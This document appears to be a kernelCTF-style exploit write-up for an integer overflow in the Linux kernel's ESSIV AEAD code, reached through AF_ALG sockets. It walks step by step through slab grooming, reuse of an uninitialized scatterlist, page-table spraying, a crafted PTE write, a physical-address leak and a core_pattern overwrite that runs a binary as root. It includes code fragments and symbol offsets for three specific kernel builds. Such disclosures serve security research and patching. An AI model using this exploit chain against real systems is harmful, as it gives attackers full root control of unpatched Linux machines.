# Triggering the Vulnerability

This is an integer overflow vulnerability in the kernel's ESSIV (Encrypted Salt-Sector Initialization Vector) AEAD template, specifically in `essiv_aead_crypt` (`crypto/essiv.c`). The ESSIV template wraps an inner AEAD cipher (typically `authenc(hmac(sha256),cbc(aes))`) and transforms the IV by encrypting it with a key derived from the hash of the cipher key. It is designed for dm-crypt, which embeds the encrypted IV within the AAD (Associated Authenticated Data) region of the AEAD request.

The vulnerability is triggered when `req->assoclen` is smaller than `crypto_aead_ivsize(tfm)`. In the in-place or decryption path (`req->src == req->dst || !enc`), `essiv_aead_crypt` computes the offset where the encrypted IV should be copied back into the destination scatterlist:

```c
static int essiv_aead_crypt(struct aead_request *req, bool enc)
{
    struct crypto_aead *tfm = crypto_aead_reqtfm(req);
    const struct essiv_tfm_ctx *tctx = crypto_aead_ctx(tfm);
    struct essiv_aead_request_ctx *rctx = aead_request_ctx(req);
    /* ... */

    crypto_cipher_encrypt_one(tctx->essiv_cipher, req->iv, req->iv);

    rctx->assoc = NULL;
    if (req->src == req->dst || !enc) {
        scatterwalk_map_and_copy(req->iv, req->dst,
                     req->assoclen - crypto_aead_ivsize(tfm), // [1]
                     crypto_aead_ivsize(tfm), 1);
    } else {
        /* ... */
        int ssize = req->assoclen - ivsize;  // [2]
        if (ssize < 0)
            return -EINVAL;
        /* ... */
    }
    /* ... */
}
```

At **[1]**, the subtraction `req->assoclen - crypto_aead_ivsize(tfm)` is performed on unsigned integers (`req->assoclen` is `unsigned int`, `crypto_aead_ivsize()` returns `unsigned int`). When `assoclen = 0` and `ivsize = 16`, the result wraps to `0xfffffff0`, which is passed as the `start` offset to `scatterwalk_map_and_copy`. Note that the `else` branch at **[2]** assigns the subtraction to a signed `int ssize` and correctly checks for `ssize < 0`, but this check only applies to the out-of-place encryption path (`req->src != req->dst && enc`). The in-place/decryption path at **[1]** has no such check.

From userspace, we trigger the vulnerability via AF_ALG:

1. Create a socket with `essiv(authenc(hmac(sha256),cbc(aes)),sha256)`.
2. Send data with `ALG_SET_AEAD_ASSOCLEN = 0` and `ALG_SET_OP = ALG_OP_DECRYPT`.
3. Call `recv` to trigger `aead_recvmsg` -> `essiv_aead_decrypt` -> `essiv_aead_crypt`.

Inside the kernel, `_aead_recvmsg` (`crypto/algif_aead.c`) copies the user's `ctx->aead_assoclen` (set to 0) into `req->assoclen` via `aead_request_set_ad`. Since this is a decrypt operation, the condition `!enc` is true, so execution enters the vulnerable branch at **[1]**. The function `scatterwalk_map_and_copy` then calls `scatterwalk_ffwd` with the overflowed offset `0xfffffff0`:

```c
struct scatterlist *scatterwalk_ffwd(struct scatterlist dst[2],
                     struct scatterlist *src, unsigned int len)
{
    for (;;) {
        if (!len)
            return src;
        if (src->length > len)
            break;
        len -= src->length;
        src = sg_next(src);
    }
    /* ... */
}
```

This loop subtracts each scatterlist entry's length from the overflowed offset, walking through the entire scatterlist chain. Once it walks past the valid entries, `sg_next` begins reading from uninitialized or attacker-controlled memory that follows the scatterlist in the slab allocation. This transforms the integer overflow into an arbitrary write primitive: the kernel writes the 16-byte encrypted IV (`req->iv`) to a location determined by the `page_link`, `offset`, and `length` fields of the out-of-bounds scatterlist entry.

# How the Scatterlist Reaches essiv_aead_crypt

To understand why `scatterwalk_ffwd` reads attacker-controlled scatterlist entries, we need to trace the full data path from the userspace `recv` call through the AF_ALG framework to the ESSIV crypto layer — and critically, understand why the RX SGL is left **entirely uninitialized**.

## The af_alg_async_req structure and its inline SGL

When `_aead_recvmsg` handles a `recv` call, it allocates a crypto request structure via `af_alg_alloc_areq` using `sock_kmalloc`. This structure contains the RX scatterlist inline:

```c
// include/crypto/if_alg.h
struct af_alg_async_req {
    struct kiocb *iocb;
    struct sock *sk;
    struct af_alg_rsgl first_rsgl;   // <-- inline RX SGL
    struct af_alg_rsgl *last_rsgl;
    struct list_head rsgl_list;
    struct scatterlist *tsgl;
    unsigned int tsgl_entries;
    unsigned int outlen, areqlen;
    union { struct aead_request aead_req; /* ... */ } cra_u;
    /* cipher request context trails this struct */
};
```

The `first_rsgl` contains an `af_alg_sgl`, which embeds the scatterlist array:

```c
// include/crypto/if_alg.h
#define ALG_MAX_PAGES  16

struct af_alg_sgl {
    struct sg_table sgt;
    struct scatterlist sgl[ALG_MAX_PAGES + 1];  // 17 entries: sgl[0..16]
    bool need_unpin;
};
```

The array has `ALG_MAX_PAGES + 1 = 17` entries. Normally, `af_alg_get_rsgl` would call `sg_init_table(sgl, 16)` to zero `sgl[0..15]` and `extract_iter_to_sg` to populate entries from the user's iovec. But in this exploit, **none of that happens**.

## Why outlen = 0 leaves the entire SGL uninitialized

The exploit sends exactly 0x20 (32) bytes via `sendmsg` on the ESSIV socket. The ESSIV template wraps `authenc(hmac(sha256),cbc(aes))`, whose authentication tag size (`crypto_aead_authsize`) is 32 bytes (full HMAC-SHA256 output). In `_aead_recvmsg`, the output length for decryption is:

```c
// crypto/algif_aead.c: _aead_recvmsg()
used = ctx->used;           // 0x20 (32 bytes sent via sendmsg)
outlen = used - as;         // 32 - 32 = 0 (decryption subtracts the tag size)

areq = af_alg_alloc_areq(sk, sizeof(struct af_alg_async_req) +
                              crypto_aead_reqsize(tfm));
err = af_alg_get_rsgl(sk, msg, flags, areq, outlen, &usedpages);
//                                          ^^^^^^ outlen = 0
```

Inside `af_alg_get_rsgl`, the loop condition immediately fails:

```c
// crypto/af_alg.c: af_alg_get_rsgl()
while (maxsize > len && msg_data_left(msg)) {  // 0 > 0 is false → loop never executes
    // sg_init_table() is NEVER called
    // extract_iter_to_sg() is NEVER called
}
```

**The entire `first_rsgl.sgl.sgl[0..16]` array is left uninitialized.** Since `sock_kmalloc` does not zero memory, the SGL contains whatever residual data was in the slab slot from a previous allocation/free cycle.

## How the SGL becomes req->dst in essiv_aead_crypt

Despite the SGL being uninitialized, `_aead_recvmsg` proceeds to use it:

```c
// crypto/algif_aead.c: _aead_recvmsg() — decryption path
rsgl_src = areq->first_rsgl.sgl.sgt.sgl;   // points to uninitialized SGL!

aead_request_set_crypt(&areq->cra_u.aead_req,
                       rsgl_src,                      // req->src = uninitialized SGL
                       areq->first_rsgl.sgl.sgt.sgl,  // req->dst = same
                       used, ctx->iv);
aead_request_set_ad(&areq->cra_u.aead_req, ctx->aead_assoclen);
```

Since `req->src == req->dst` (both point to the same uninitialized `first_rsgl.sgl.sgt.sgl`), `essiv_aead_crypt` enters the vulnerable in-place/decryption branch. The `sendmsg` assoclen (set to 0) triggers the integer overflow: `req->assoclen - crypto_aead_ivsize(tfm)` = `0 - 16` = `0xfffffff0`.

## Planting residual data: the chained SGL technique

The exploit needs the ESSIV areq's uninitialized `first_rsgl.sgl.sgl[]` to contain residual data that guides `scatterwalk_ffwd` to a controlled page. This is achieved by constructing a **chained SGL** in a sacrificial areq, freeing it, then reclaiming only the middle link with crafted data — preserving the chain to freed anonymous pages.

### How af_alg_get_rsgl chains multiple rsgl allocations

When `af_alg_get_rsgl` processes more iovec data than fits in one rsgl (which holds `ALG_MAX_PAGES = 16` entries), it allocates additional rsgl structures via `sock_kmalloc` and chains them:

```c
// crypto/af_alg.c: af_alg_get_rsgl()
while (maxsize > len && msg_data_left(msg)) {
    if (list_empty(&areq->rsgl_list))
        rsgl = &areq->first_rsgl;          // first 16 entries are inline
    else
        rsgl = sock_kmalloc(sk, sizeof(*rsgl), GFP_KERNEL);  // second rsgl allocated

    sg_init_table(rsgl->sgl.sgt.sgl, ALG_MAX_PAGES);
    err = extract_iter_to_sg(&msg->msg_iter, seglen, &rsgl->sgl.sgt, ALG_MAX_PAGES, 0);
    sg_mark_end(rsgl->sgl.sgt.sgl + rsgl->sgl.sgt.nents - 1);

    if (areq->last_rsgl)
        af_alg_link_sg(&areq->last_rsgl->sgl, &rsgl->sgl);  // chain previous → new
    areq->last_rsgl = rsgl;
}
```

`af_alg_link_sg` unmarks `SG_END` on the previous rsgl's last entry and sets up a chain entry (`sgl[nents]`) that links to the new rsgl:

```c
static void af_alg_link_sg(struct af_alg_sgl *sgl_prev, struct af_alg_sgl *sgl_new) {
    sg_unmark_end(sgl_prev->sgt.sgl + sgl_prev->sgt.nents - 1);
    sg_chain(sgl_prev->sgt.sgl, sgl_prev->sgt.nents + 1, sgl_new->sgt.sgl);
}
```

### How _aead_recvmsg chains rsgl → tsgl

In the decryption path, `_aead_recvmsg` also chains the last rsgl to the tag SGL (`areq->tsgl`), which holds reassigned TX SGL entries containing the anonymous pipe pages:

```c
// crypto/algif_aead.c: _aead_recvmsg() — decryption path
af_alg_pull_tsgl(sk, processed, areq->tsgl, processed - as);

if (usedpages) {
    struct af_alg_sgl *sgl_prev = &areq->last_rsgl->sgl;
    struct scatterlist *sg = sgl_prev->sgt.sgl;
    sg_unmark_end(sg + sgl_prev->sgt.nents - 1);
    sg_chain(sg, sgl_prev->sgt.nents + 1, areq->tsgl);  // chain last rsgl → tsgl
}
```

### The full chained SGL layout in the sacrificial areq

The sacrificial `recvmsg` provides 32 iovecs (1 byte each). `af_alg_get_rsgl` fills:

1. **first_rsgl** (inline, in the areq): `sgl[0..15]` = 16 entries × 1 byte each. `sgl[16]` = chain entry → second_rsgl.
2. **second_rsgl** (separate `sock_kmalloc`): entries for the remaining iovecs. Last entry chains → areq->tsgl.
3. **areq->tsgl**: allocated by `_aead_recvmsg`'s decryption path via `sock_kmalloc(sk, array_size(sizeof(*areq->tsgl), areq->tsgl_entries), ...)`, then filled by `af_alg_pull_tsgl` which reassigns the tag portion of the TX SGL into this new array. These entries have `page_link` fields pointing to **anonymous pipe pages** (allocated via `alloc_page` during `splice`). Since the pipes were closed, the only reference to these pages is held by the alg socket's TX SGL.

The 17 splice calls are intentional: they ensure `areq->tsgl_entries` is large (the tag region spans most of the splice entries), so `areq->tsgl` is allocated in a larger kmalloc slab (e.g., kmalloc-1024). Larger slab allocations are less likely to be reclaimed by other kernel heap activity, preserving the residual `page_link` data until the exploit needs it.

The full SGL chain is: `first_rsgl[0..15] → chain → second_rsgl[0..N] → chain → tsgl[0..M]` (pipe pages).

### Freeing: anonymous pages become reclaimable

`af_alg_free_resources` calls `af_alg_free_areq_sgls`, which:
- Frees RX SGL pages (unpins iovec pages)
- Frees the second_rsgl via `sock_kfree_s` (separate allocation)
- Calls `put_page` on each tsgl entry's page — since the pipes were closed, the refcount drops to zero and the **anonymous pages are freed back to the page allocator**
- Frees the tsgl slab via `sock_kfree_s`
- Then frees the areq itself via `sock_kfree_s`

After this, the slab contains:
- **areq slab slot**: residual first_rsgl with 16 × length-1 entries + chain entry in `sgl[16]` pointing to the second_rsgl's (now freed) slab address
- **second_rsgl slab slot**: residual SGL entries + chain entry pointing to the tsgl's (now freed) slab address
- **tsgl slab slot**: residual entries with `page_link` pointing to the freed anonymous pages

### Reclaiming second_rsgl with crafted data via ctl_buf spray

The exploit calls `sendmsg(unix_sockfd[1], ...)` with `msg_control` pointing to a 0x208-byte crafted buffer. Inside `____sys_sendmsg` (`net/socket.c`):

```c
if (ctl_len > sizeof(ctl)) {
    ctl_buf = sock_kmalloc(sock->sk, ctl_len, GFP_KERNEL);
}
copy_from_user(ctl_buf, msg_sys->msg_control_user, ctl_len);
// ... sendmsg processing ...
sock_kfree_s(sock->sk, ctl_buf, ctl_len);
```

This `sock_kmalloc(0x208)` reclaims the **second_rsgl slab slot**. The crafted data overwrites the beginning of the slot, placing a fake `struct scatterlist` at `FAKE_SGL_ENTRY_OFFSET` (0x1f0 = 0x10 + 0xf × 0x20) with `length = 0xffffffe0`. Crucially, the 0x208-byte write does **not** reach the chain entry that linked second_rsgl → tsgl (which is at a higher offset in the original `af_alg_rsgl`). That chain link is preserved as residual data. After `sock_kfree_s`, the slab slot contains: crafted fake SGL entry + preserved chain → old tsgl.

### How scatterwalk_ffwd traverses the residual chain

When the ESSIV `recv` allocates its areq from the same slab slot as the old sacrificial areq, the uninitialized `first_rsgl.sgl.sgl[]` still contains the residual data. `scatterwalk_ffwd` walks with `len = 0xfffffff0`:

| Step | Entry | `length` | Action | `len` after |
|------|-------|----------|--------|-------------|
| 1-16 | first_rsgl `sgl[0..15]` | 1 each (residual) | `len -= 1` × 16 | `0xffffffe0` |
| 17 | first_rsgl `sgl[16]` | chain entry → second_rsgl | `sg_next` follows chain | `0xffffffe0` |
| 18 | second_rsgl crafted entry | `0xffffffe0` | `len -= 0xffffffe0` | `0` |
| 19 | `len == 0` → return `src` | `sg_next` follows preserved chain → tsgl | — | — |

`scatterwalk_ffwd` returns the tsgl entry, whose `page_link` points to a freed anonymous page. This page has been reclaimed as a **PTE page** by the exploit's page table spray (Step 3). The kernel then writes the 16-byte encrypted IV to this PTE page via `scatterwalk_copychunks`.

# Exploit

## Overview

The exploit runs in two passes using `fork()`. After forking, the child blocks on a Unix socket waiting for a physical address. The parent runs the first pass: it leaks a physical address by writing the encrypted IV (which encodes a PTE-like value) into a user page table entry, then sends the leaked address to the child via the Unix socket. The child unblocks and runs the second pass: it uses the leaked address to target `core_pattern`, overwriting it to achieve privilege escalation. Both passes use the same primitive: controlling the destination of the 16-byte IV write by crafting fake scatterlist entries via slab reuse.

## Step 1: Pre-compute the IV to control the write target

The key insight is that `essiv_aead_crypt` encrypts the IV in-place before writing it to the scatterlist destination:

```c
crypto_cipher_encrypt_one(tctx->essiv_cipher, req->iv, req->iv);
/* ... */
scatterwalk_map_and_copy(req->iv, req->dst, ..., ivsize, 1);
```

The ESSIV encryption is a single-block AES-ECB encrypt using a salt key derived from `SHA256(enc_key || auth_key)`. Since we control the keys and the IV, we can choose an IV that, after ESSIV encryption, produces the exact 16 bytes we want written. The exploit pre-computes this by performing the inverse operation in userspace using OpenSSL:

```c
int compute_iv(uint8_t* iv) {
    /* Compute salt = SHA256(enc_key || auth_key) */
    uint8_t salt[32];
    compute_essiv_salt(enc_key, 16, auth_key, 32, salt);
    /* Decrypt the desired output value to get the IV input */
    essiv_decrypt_iv_ecb(salt, 32, iv, iv_dec);
    memcpy(iv, iv_dec, 16);
}
```

On the first pass, the IV is pre-computed to produce a valid x86-64 PTE value (`0x800000000009c067`) that points to physical address `0x9c000`. This is the fixed physical address of [`trampoline_pgd`](https://github.com/google/security-research/blob/ca13fc6d5e7184b13bb82a91dd3a6fa2430fdbd7/pocs/linux/kernelctf/CVE-2023-6560_mitigation/docs/exploit.md#leak-through-write), which contains the kernel's `_brk` area virtual address. The PTE has present+writable+user+accessed+dirty flags set. When this PTE is written into a page table, it maps a user page to `trampoline_pgd`, allowing the exploit to read the `_brk` area address and derive the physical address of `_stext`.

On the second pass, the IV is pre-computed to produce a PTE pointing to the physical page containing `core_pattern` (calculated from the physical address leaked in the first pass plus the known kernel offset `CORE_PATTERN_BASE`).

## Step 2: Construct and plant residual chained SGL data

This is the central trick of the exploit. As described in detail above (see "Planting residual data: the chained SGL technique"), the exploit:

**Phase 2a:** Creates a sacrificial `authenc(hmac(sha512),cbc(aes))` socket and fills its TX SGL with anonymous pipe page references via `sendmsg` + 17 `splice` calls. Closing the pipes ensures the alg socket holds the only reference to these pages.

**Phase 2b:** Calls `recvmsg(authenc_opfd, ...)` with 32 iovecs (1 byte each), which builds a chained SGL: `first_rsgl[0..15]` (16 × 1-byte entries) → `sgl[16]` chain → `second_rsgl` → chain → `tsgl` (anonymous pipe pages). After the crypto operation, `af_alg_free_resources` frees everything: unpins iovec pages, frees second_rsgl, calls `put_page` on pipe pages (freeing them to the page allocator), frees tsgl, frees areq. The slab slots retain residual data including the chain links.

**Phase 2c:** Calls `sendmsg(unix_sockfd[1], ...)` with `msg_control` = 0x208-byte crafted buffer. The `____sys_sendmsg` ctl_buf spray (`sock_kmalloc` → copy → `sock_kfree_s`) reclaims the **second_rsgl** slab slot, planting a fake SGL entry with `length = 0xffffffe0` at offset `FAKE_SGL_ENTRY_OFFSET` (0x1f0). The 0x208-byte write does not reach the chain link to tsgl (at a higher offset), preserving it as residual data.

The result: the areq slab slot contains a residual chained SGL where `first_rsgl → second_rsgl` (crafted, with length=0xffffffe0) `→ tsgl` (freed anonymous pages, soon to be reclaimed as PTE pages).

## Step 3: Spray user page tables as write targets

Before triggering the ESSIV vulnerability, the exploit allocates 0x400 pages at fixed virtual addresses spaced 0x200000 (2 MB) apart:

```c
char *maddr = (void *)0x200000;
for (int i = 0; i < 0x400; i++) {
    addrs[i] = mmap(maddr + 0x200000 * i, 0x1000, PROT_READ | PROT_WRITE,
                    MAP_PRIVATE | MAP_ANON | MAP_FIXED, -1, 0);
}
```

Each page has its own page table entry (PTE). The wide 2 MB spacing ensures each page lives in a different PTE page, spreading the targets across physical memory. Before triggering the recv, we touch all pages (`sum += addrs[i][0]`) to ensure their PTEs are populated.

## Step 4: Trigger the overflow and identify the victim page

Calling `recv(opfd, buf, 32, 0)` on the ESSIV socket triggers `_aead_recvmsg` → `essiv_aead_crypt` with `assoclen = 0`. Crucially, `outlen = used - authsize = 0x20 - 0x20 = 0`, so `af_alg_get_rsgl` returns early without initializing the RX SGL — the entire `first_rsgl.sgl.sgl[]` contains residual data from the slab (planted in Step 2). The integer overflow (`0 - 16 = 0xfffffff0`) causes `scatterwalk_ffwd` to walk through the residual SGL entries, hit the crafted fake entry (which consumes most of the offset), and resolve to a freed page now serving as a PTE page. The kernel writes the 16-byte encrypted IV (a valid PTE value from Step 1) into this page table entry.

After `recv` returns, the exploit scans all 0x400 pages to find which one was affected:

```c
for (int i = 0; i < 0x400; i++) {
    if (addrs[i][0]) {  // PTE was overwritten, page now maps to different physical memory
        size_t pa_leak = *(size_t*)addrs[i];  // Read from the remapped page
        size_t pa_target = pa_leak & (~0xffff);
        pa_target -= BRK_BASE;  // Calculate _stext physical address
        write(cfd[1], &pa_target, 8);  // Send to child (unblocks it for pass 2)
        break;
    }
}
```

The first-pass IV encodes a PTE pointing to physical address `0x9c000` (`trampoline_pgd`). When the PTE is overwritten, the user page is remapped to this physical page. Reading from the remapped page reveals the `_brk` area virtual address stored in `trampoline_pgd`, from which we derive the physical address of `_stext` by subtracting the known offset `BRK_BASE` (the virtual offset of the kernel's brk region from `_stext`). See the [CVE-2023-6560 exploit documentation](https://github.com/google/security-research/blob/ca13fc6d5e7184b13bb82a91dd3a6fa2430fdbd7/pocs/linux/kernelctf/CVE-2023-6560_mitigation/docs/exploit.md#leak-through-write) for details on this technique.

## Step 5: Second pass to overwrite core_pattern

The child process, which has been blocked on `read(cfd[0], &stext_phys, 8)` since the fork, now receives the leaked physical address from the parent. It computes the PTE value that maps to the physical page containing `core_pattern`:

```c
pa_target = stext_phys + CORE_PATTERN_BASE;
pa_target |= 0x8000000000000867;  // Present | RW | User | Accessed | Dirty | NX
*(size_t*)&iv[0] = pa_target;
```

The child then re-executes the entire exploit flow (Steps 1-4) with this new IV. After the second `recv`, one of the 0x400 user pages now maps directly to the kernel page containing `core_pattern`. The exploit overwrites it:

```c
strcpy(addrs[i] + CORE_PATTERN_OFFSET, "|/proc/%P/exe %P");
```

## Step 6: Privilege escalation via core_pattern

After overwriting `core_pattern`, a child process crashes itself with a null pointer dereference:

```c
if (fork() == 0) {
    setsid();
    *(volatile size_t *)0 = 0;  // Trigger segfault
}
```

The kernel's core dump handler reads the overwritten `core_pattern` (`|/proc/%P/exe %P`) and executes the exploit binary as root, passing the crashing process's PID as an argument. The exploit binary detects the PID argument, uses `pidfd_open` + `pidfd_getfd` to steal the parent's stdin/stdout/stderr file descriptors, and reads the flag.

## Differences between targets

All three targets (LTS, COS, mitigation) use identical exploit logic. The only differences are the kernel symbol addresses, compiled as conditional `#define`s:

| Target | `CORE_PATTERN` (virtual) | `BRK_BASE` (virtual) |
|--------|--------------------------|----------------------|
| lts-6.12.48 | `0xffffffff842107e0` | `0xffffffff85600000` |
| cos-121-18867.199.56 | `0xffffffff83fb4940` | `0xffffffff85200000` |
| mitigation-v4-6.6 | `0xffffffff83db3720` | `0xffffffff84e00000` |

No KASLR bypass is needed on any target because the exploit operates entirely through physical addresses. The first pass leaks the physical address of `_stext`, and the second pass computes the physical address of `core_pattern` using the fixed virtual offset (`CORE_PATTERN_BASE = CORE_PATTERN & ~0xfff`). Since the PTE write directly maps a user page to the target physical address, KASLR (which randomizes virtual addresses) does not affect the exploit.
